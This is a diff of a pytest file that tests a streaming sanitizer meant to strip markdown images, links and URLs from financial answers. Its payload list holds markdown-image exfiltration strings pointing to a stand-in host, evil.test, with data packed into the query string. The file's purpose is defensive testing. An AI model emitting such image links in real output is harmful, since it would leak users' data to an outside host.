@@ -1,36 +1,38 @@
 import pytest
 
-from utils.answer_sanitizer import MAX_HOLD, AnswerSanitizer, sanitize
+from utils.answer_sanitizer import AnswerSanitizer, sanitize
+
+PAYLOADS = [
+    "Up 2% ![x](https://evil.test/?d=63313) done.",
+    "Up 2% ![c][r]\n\n[r]: //evil.test/?d=AAPL_6000\n",
+    "Up 2% ![[a]](//evil.test/?d=1) [Reuters news](https://r.com) www.evil.test/a",
+    "![c](https://evil.test/c?d=" + "9" * 600 + ")",
+]
 
 
-def stream(chunks: list[str]) -> str:
+def stream(text: str, size: int) -> str:
     s = AnswerSanitizer()
-    return "".join(s.feed(c) for c in chunks) + s.flush()
+    return "".join(s.feed(text[i : i + size]) for i in range(0, len(text), size)) + s.flush()
 
 
-def test_sanitize_strips_images_links_tags_and_urls():
-    text = "Up ![x](https://evil.test/?d=63313) see [Reuters](https://r.com) <img src=x> or https://evil.test/a and www.x.io ok"
-    assert sanitize(text) == "Up  see Reuters  or  and  ok"
+@pytest.mark.parametrize("payload", PAYLOADS)
+@pytest.mark.parametrize("size", [1, 2, 3, 4, 7, 50])
+def test_no_link_or_image_syntax_survives_streaming(payload, size):
+    out = stream(payload, size)
+
+    assert out == sanitize(payload)
+    assert "[" not in out and "]" not in out
+    assert "://" not in out
+    assert "www." not in out.lower()
 
 
-@pytest.mark.parametrize("size", [1, 2, 3, 7])
-def test_split_across_chunks_still_stripped(size):
-    text = "TSLA fell 7%. ![x](https://evil.test/?d=63313) [src](https://r.com) <b>bold</b> https://evil.test/p done.\n"
-    chunks = [text[i : i + size] for i in range(0, len(text), size)]
-
-    assert stream(chunks) == sanitize(text)
-    assert "evil" not in stream(chunks)
+def test_plain_text_comparisons_and_cjk_pass_through():
+    text = "Beta <1 but volatility >25% (see above).\n特斯拉今天下跌了7%。"
+    assert stream(text, 2) == text
 
 
-def test_plain_text_streams_through_with_last_word_held():
+def test_streams_with_a_short_lag():
     s = AnswerSanitizer()
-    assert s.feed("Apple rose 2% ") == "Apple rose 2% "
-    assert s.feed("toda") == ""
-    assert s.feed("y.\n") == "today.\n"
-
-
-def test_stray_bracket_does_not_hold_everything():
-    s = AnswerSanitizer()
-    out = s.feed("[" + "a " * MAX_HOLD)
-    assert len(out) > 0
-    assert len(out) + len(s.flush()) == 1 + 2 * MAX_HOLD
+    assert s.feed("Apple rose 2% today") == "Apple rose 2% to"
+    assert s.feed(".") == "d"
+    assert s.flush() == "ay."
